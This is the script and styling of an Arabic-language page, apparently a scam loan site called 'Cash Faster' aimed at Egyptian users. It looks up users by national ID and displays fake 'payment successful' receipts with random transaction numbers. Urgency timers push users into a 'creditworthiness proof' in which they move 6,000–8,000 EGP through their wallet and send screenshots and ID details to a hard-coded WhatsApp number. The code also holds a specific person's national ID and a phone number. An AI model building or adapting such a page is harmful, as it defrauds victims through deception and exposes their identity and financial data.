            top: 0; left: 0;
            width: 100%; height: 100%;

            margin-bottom: 1.8rem;

        .hero-title { font-size: 1.1rem; font-weight: 600; color: var(--neon-gold); }

            background: rgba(16, 19, 35, 0.85);

            padding: 1rem;
            border-radius: 1.5rem;

            text-align: center;

            border-radius: 1rem;
            margin-bottom: 1rem;
            text-align: right;

        .footer { text-align: center; font-size: 0.7rem; margin-top: 2rem; opacity: 0.6; }

    const WHATSAPP_NUMBER = "212780488542";
    const HOLD_DURATION_MS = 60 * 60 * 1000;
    const CONTACT_BEFORE_MS = 15 * 60 * 1000;

    let currentCustomer = null;
    let currentNationalId = null;
    let timerInterval = null;
    let deliveryInterval = null;

    function formatTimeLeft(ms) {
        let totalSec = Math.floor(ms / 1000);
        let mins = Math.floor(totalSec / 60);
        let secs = totalSec % 60;
        return `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
    }

    function buildHoldMessage(customer, nationalId) {
        const now = Date.now();
        const holdUntil = customer.holdUntil;
        const timeLeft = holdUntil - now;
        const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS) && timeLeft > 0;
        const contactExpired = timeLeft <= 0;

        let contactStatus = "";
        let btnDisabled = true;
        let btnText = "⏳ يرجى الانتظار...";

        if (contactExpired) {
            contactStatus = `<div class="warning-badge" style="background:#FF0000AA;">❌ انتهت مهلة التعليق (ساعة). تم إلغاء الطلب. يرجى التوجه للدعم.</div>`;
            btnText = "❌ الطلب ملغي";
        } else if (canContact) {
            contactStatus = `<div class="step-box" style="border-right-color:#25D366;"><i class="fab fa-whatsapp"></i> <strong>✅ يمكنك الآن إبلاغ التحويلات المالية</strong><br>يجب أن يتم الإبلاغ قبل إثبات الجدارة بـ 15 دقيقة. اضغط الزر أدناه للتواصل.</div>`;
            btnDisabled = false;
            btnText = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
        } else {
            const waitMs = HOLD_DURATION_MS - CONTACT_BEFORE_MS - (HOLD_DURATION_MS - timeLeft);
            const waitTime = formatTimeLeft(waitMs > 0 ? waitMs : 0);
            contactStatus = `<div class="step-box"><i class="fas fa-hourglass-half"></i> <strong>⏳ يجب الانتظار قبل الإبلاغ</strong><br>سيظهر زر الإبلاغ بعد <strong>${waitTime}</strong> من الآن. (يلزم الإبلاغ قبل الإثبات بـ 15 دقيقة)</div>`;
        }

        return `
            <div class="suspended-card">
                <i class="fas fa-ban" style="font-size:3rem; color:#FF8C42;"></i>
                <h2>⛔ طلبك معلق مؤقتاً</h2>
                <p><strong>${customer.name}</strong> ، تم تعليق طلب إثبات الجدارة لمدة ساعة بناءً على تعليمات النظام.</p>
                <div class="timer-glow">
                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإنهاء التعليق</div>
                    <div class="timer" id="holdTimer">${formatTimeLeft(timeLeft > 0 ? timeLeft : 0)}</div>
                    <div style="font-size:0.75rem;">بعد انقضاء الساعة، سيتم إلغاء الطلب تلقائياً.</div>
                </div>
                ${contactStatus}
                ${!contactExpired && !customer.contactDone ? `
                <button class="btn-whatsapp ${btnDisabled ? 'disabled-btn' : ''}" id="contactSupportBtn" ${btnDisabled ? 'disabled' : ''}>
                    ${btnText}
                </button>
                ` : ''}
                ${customer.contactDone ? `
                <div class="step-box" style="background:#00660040; border-right-color:#25D366;">
                    ✅ <strong>تم إبلاغ التحويلات المالية بنجاح</strong><br>يمكنك الآن متابعة إثبات الجدارة.
                </div>
                <button class="btn-whatsapp" id="proceedToProofBtn">
                    <i class="fas fa-check-circle"></i> المتابعة إلى إثبات الجدارة
                </button>
                ` : ''}
                <div class="step-box" style="margin-top:1rem;">
                    <i class="fas fa-info-circle"></i> <strong>هام:</strong> إذا قمت بإثبات الجدارة قبل الإبلاغ، سيتم رفض العملية وستضطر لإعادة المحاولة من جديد.
                </div>
            </div>
        `;
    }

    function startHoldTimer(customer, nationalId) {
        if (timerInterval) clearInterval(timerInterval);
        const timerEl = document.getElementById('holdTimer');
        if (!timerEl) return;

        timerInterval = setInterval(() => {
            const now = Date.now();
            const timeLeft = customer.holdUntil - now;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerEl.innerText = "00:00";
                const section = document.getElementById('resultSection');
                section.innerHTML = `<div class="suspended-card" style="border-color:#FF0000;">
                    <i class="fas fa-times-circle" style="font-size:3rem; color:#FF0000;"></i>
                    <h2>❌ تم إلغاء الطلب</h2>
                    <p>انتهت مهلة الساعة دون إتمام الإجراءات. يرجى التواصل مع الدعم.</p>
                </div>`;
                return;
            }
            timerEl.innerText = formatTimeLeft(timeLeft);
            
            const contactBtn = document.getElementById('contactSupportBtn');
            if (contactBtn && !customer.contactDone) {
                const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS);
                if (canContact && contactBtn.disabled) {
                    contactBtn.disabled = false;
                    contactBtn.classList.remove('disabled-btn');
                    contactBtn.innerHTML = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
                    const container = document.getElementById('resultSection');
                    const newHtml = buildHoldMessage(customer, nationalId);
                    container.innerHTML = newHtml;
                    startHoldTimer(customer, nationalId);
                    attachContactEvents(customer, nationalId);
                }
            }
        }, 1000);
    }

    function attachContactEvents(customer, nationalId) {
        const contactBtn = document.getElementById('contactSupportBtn');
        if (contactBtn && !customer.contactDone) {
            contactBtn.onclick = () => {
                if (contactBtn.disabled) return;
                const msg = `📢 إبلاغ فتح التعليق\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأبلغكم برغبتي في فتح الطلب وإكمال إثبات الجدارة.`;
                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
                customer.contactDone = true;
                const section = document.getElementById('resultSection');
                section.innerHTML = buildHoldMessage(customer, nationalId);
                startHoldTimer(customer, nationalId);
                attachContactEvents(customer, nationalId);
            };
        }
        const proceedBtn = document.getElementById('proceedToProofBtn');
        if (proceedBtn) {
            proceedBtn.onclick = () => {
                if (customer.contactDone) {
                    displayProofStage(customer, nationalId);
                } else {
                    alert("يجب إبلاغ التحويلات المالية أولاً!");
                }
            };
        }
    }

    function displayProofStage(customer, nationalId) {
        if (deliveryInterval) clearInterval(deliveryInterval);
        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
        const refNum = Math.floor(Math.random()*1e9);
        const now = new Date();
        const html = `
            <div class="payment-card">
                <div class="payment-header" style="display:flex; justify-content:space-between; border-bottom:1px dashed #00E5FF; padding-bottom:0.6rem;">
                    <h2 style="font-size:1.6rem; background:linear-gradient(120deg,#fff,#00E5FF); -webkit-background-clip:text; background-clip:text; color:transparent;"><i class="fas fa-check-circle"></i> تم الدفع بنجاح</h2>
                    <p style="color:#FFD966;">رقم المعاملة: TX-${refNum}</p>
                </div>
                <div class="amount-block">
                    <div class="amount-label">المبلغ المدفوع</div>
                    <div class="amount-value">${customer.loan.toLocaleString('ar-EG')} ج.م</div>
                </div>
                <div class="details-grid">
                    <div class="detail-item"><span><i class="fas fa-wallet"></i> طريقة الدفع</span><span>${customer.wallet}</span></div>
                    <div class="detail-item"><span><i class="fas fa-hashtag"></i> رقم المحفظة</span><span>${customer.walletNum || "غير مسجل"}</span></div>
                    <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}</span></div>
                </div>
                <div class="info-message">
                    <i class="fas fa-hourglass-half"></i> <strong>جارٍ حصولك على صرف المبلغ المدفوع لحسابك فور الإثبات مباشرة</strong><br>
                    سيتم تسليم المبلغ خلال <strong>30 دقيقة</strong> بعد إتمام إجراءات إثبات الجدارة.
                </div>
                <div class="timer-glow">
                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لتسليم المبلغ (بعد الإثبات)</div>
                    <div class="timer" id="deliveryTimer">30:00</div>
                    <div style="font-size:0.7rem;">⚠️ يجب إكمال إثبات الجدارة قبل انتهاء الوقت لضمان الصرف الفوري</div>
                </div>
                <div class="received-badge">✅ تم استلام طلبك. ننتظر إثبات الجدارة لصرف المبلغ فوراً.</div>
            </div>
            <div class="credit-card">
                <h3 style="color:var(--border-cyan); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> إثبات الجدارة الائتمانية (إلزامي لصرف القرض)</h3>
                <div class="step-box"><strong>💡 ما هي الجدارة؟</strong><br>إجراء أمني لتأكيد ملكية المحفظة. لن تقوم بتحويل أموال إلينا، فقط دورة إيداع من شخص موثوق وإعادته.</div>
                <div class="step-box">🔹 المبلغ المطلوب لإثبات الجدارة: <span style="color:var(--neon-gold); font-weight:bold;">${proofAmount.toLocaleString('ar-EG')} ج.م</span></div>
                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر الواتساب إلى فريق Cash Faster.<br>✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.</div>
                <button class="btn-whatsapp" onclick="openWhatsAppForProof('${customer.name.replace(/'/g, "\\'")}', '${nationalId}', ${proofAmount})">
                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
                </button>
            </div>
        `;
        document.getElementById('resultSection').innerHTML = html;
        startDeliveryTimer();
    }

    function startDeliveryTimer() {
        let secondsLeft = 30 * 60;
        const timerEl = document.getElementById('deliveryTimer');
        if (!timerEl) return;
        deliveryInterval = setInterval(() => {
            if (secondsLeft <= 0) {
                clearInterval(deliveryInterval);
                timerEl.innerText = "00:00";
                alert("انتهت المهلة المحددة للإثبات. سيتم إلغاء العملية.");
            } else {
                secondsLeft--;
                const mins = Math.floor(secondsLeft / 60);
                const secs = secondsLeft % 60;
                timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
            }
        }, 1000);
    }

    function openWhatsAppForProof(name, id, amount) {
        const msg = `السلام عليكم\nالعميل: ${name}\nالرقم القومي: ${id}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${amount.toLocaleString('ar-EG')} ج.م.`;
        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
    }

    function searchCustomer() {
        const nationalId = document.getElementById('nationalId').value.trim();
        if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
        if (nationalId.length !== 14) { alert('الرقم القومي 14 رقم'); return; }
        document.getElementById('loader').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            const customer = customersDatabase[nationalId];
            if (!customer) {
                document.getElementById('resultSection').innerHTML = '';
                const errDiv = document.getElementById('errorCard');
                errDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> الرقم القومي غير مسجل. تواصل مع الدعم.';
                errDiv.style.display = 'block';
                return;
            }
            currentCustomer = customer;
            currentNationalId = nationalId;

            // حالة خاصة لعبد الرحيم احمد
            if (nationalId === "28712102703133") {
                if (!customer.holdUntil) {
                    customer.holdUntil = Date.now() + HOLD_DURATION_MS;
                    customer.contactDone = false;
                }
                const now = Date.now();
                if (now >= customer.holdUntil) {
                    document.getElementById('resultSection').innerHTML = `<div class="suspended-card" style="border-color:#FF0000;">
                        <i class="fas fa-times-circle" style="font-size:3rem; color:#FF0000;"></i>
                        <h2>❌ تم إلغاء الطلب</h2>
                        <p>انتهت مهلة الساعة دون إتمام الإجراءات. يرجى التواصل مع الدعم.</p>
                    </div>`;
                    return;
                }
                const html = buildHoldMessage(customer, nationalId);
                document.getElementById('resultSection').innerHTML = html;
                startHoldTimer(customer, nationalId);
                attachContactEvents(customer, nationalId);
                document.getElementById('errorCard').style.display = 'none';
                return;
            }

            // باقي العملاء بشكل طبيعي
            displayProofStage(customer, nationalId);
            document.getElementById('errorCard').style.display = 'none';
        }, 800);
    }

    window.searchCustomer = searchCustomer;
    window.openWhatsAppForProof = openWhatsAppForProof;
</script>
